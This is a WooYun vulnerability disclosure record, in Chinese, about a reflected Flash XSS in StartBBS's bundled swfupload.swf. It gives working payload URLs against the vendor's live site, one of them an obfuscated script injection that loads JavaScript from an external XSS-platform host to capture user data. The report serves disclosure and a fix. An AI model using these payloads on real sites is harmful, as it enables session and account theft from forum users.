{"id": 56254, "wybug_id": "wooyun-2014-058399", "wybug_title": "startbbs反射型跨站,可获取用户信息.(通杀所有版本)", "wybug_corp": "startbbs.com", "wybug_author": "wutongyu", "wybug_date": "2014-04-25 12:43", "wybug_open_date": "2014-07-23 18:34", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "持久型", "第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向公众公开  简要描述： rt 详细说明：  startbbs是一款基于mvc架构的开源论坛。但是某处使用了存在漏洞的组件，导致存在一个通杀的反射型跨站漏洞，由于是flash跨站，所以不受任何浏览器影响。startbbs使用了swfupload.swf 该组件，早年的时候p.z大牛就已经爆出了关于他的反射型跨站漏洞。我们构造：swfupload.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//就可以触发跨站。来看看官网，已经成功：http://www.startbbs.com/plugins/kindeditor/plugins/multiimage/images/swfupload.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//\n\n当然，官网是最新版，来看看我本地的1.14版本呢?\n\n   漏洞证明：  植入xss平台代码：http://www.startbbs.com/plugins/kindeditor/plugins/multiimage/images/swfupload.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;eval('window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,121,103,102,99,110,120,115,115,46,115,105,110,97,97,112,112,46,99,111,109,47,90,72,75,49,102,76,63,49,51,57,56,51,57,57,50,49,55);document.body.appendChild(window.s)')}}//看看效果如何：\n\n成功获取用户信息：   修复方案：  升级存在漏洞的swf组件。   版权声明：转载请注明来源 wutongyu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-07-23 18:34 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}